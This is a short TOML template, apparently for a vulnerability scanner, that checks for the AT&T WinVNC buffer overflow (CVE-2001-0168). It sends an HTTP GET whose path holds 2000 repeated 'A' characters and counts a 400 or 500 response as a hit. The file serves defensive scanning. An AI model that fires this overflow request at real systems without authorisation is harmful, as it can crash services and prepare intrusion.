[info]
author = "ave"
description = "通过发送超长 HTTP GET 请求验证 AT&T WinVNC 缓冲区溢出漏洞"
id = "POC-AVE-2001-0062"
name = "AT&T WinVNC GET Overflow PoC"
severity = "critical"
tags = ["ave-2001-0062"]
vuln_id = [
    "CVE-2001-0168",
    "AVE-2001-0062",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/{{repeat('A', 2000)}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    400,
]
type = "status"
